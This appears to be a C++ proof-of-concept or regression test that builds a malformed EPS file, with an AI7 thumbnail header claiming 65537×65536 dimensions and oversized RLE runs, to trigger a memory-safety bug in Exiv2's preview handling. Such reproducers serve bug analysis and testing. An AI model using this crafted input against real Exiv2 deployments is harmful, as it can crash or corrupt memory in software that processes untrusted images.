#include <exiv2/exiv2.hpp>

#include <cstdint>
#include <string>
#include <vector>

namespace {

std::string hex_line(const std::vector<unsigned char>& bytes) {
  static constexpr char hex[] = "0123456789ABCDEF";
  std::string out;
  out.reserve(bytes.size() * 2 + 1);
  out.push_back('%');
  for (unsigned char b : bytes) {
    out.push_back(hex[b >> 4]);
    out.push_back(hex[b & 0x0f]);
  }
  return out;
}

std::string thumbnail_eps() {
  std::vector<unsigned char> raw(256 * 3, 0);
  raw.push_back('R');
  raw.push_back('L');
  raw.push_back('E');
  for (int i = 0; i < 257; ++i) {
    raw.push_back(0xfd);
    raw.push_back(0xff);
    raw.push_back(0x00);
  }
  raw.push_back(0xfd);
  raw.push_back(0x02);
  raw.push_back(0x00);

  std::string eps;
  eps += "%!PS-Adobe-3.0 EPSF-3.0\n";
  eps += "%AI7_Thumbnail: 65537 65536 8\n";
  eps += "%%BeginData: 1 Hex\n";
  eps += hex_line(raw);
  eps += "\n%%EndData\n%%EOF\n";
  return eps;
}

}  // namespace

int main(void) {
  Exiv2::LogMsg::setLevel(Exiv2::LogMsg::mute);
  const std::string eps = thumbnail_eps();
  try {
    Exiv2::Image::UniquePtr image = Exiv2::ImageFactory::open(
        reinterpret_cast<const Exiv2::byte*>(eps.data()), eps.size());
    if (!image)
      return 0;
    image->readMetadata();
    Exiv2::PreviewManager manager(*image);
    const Exiv2::PreviewPropertiesList previews = manager.getPreviewProperties();
    (void)previews;
  } catch (const Exiv2::Error&) {
    return 0;
  } catch (const std::exception&) {
    return 0;
  }
  return 0;
}
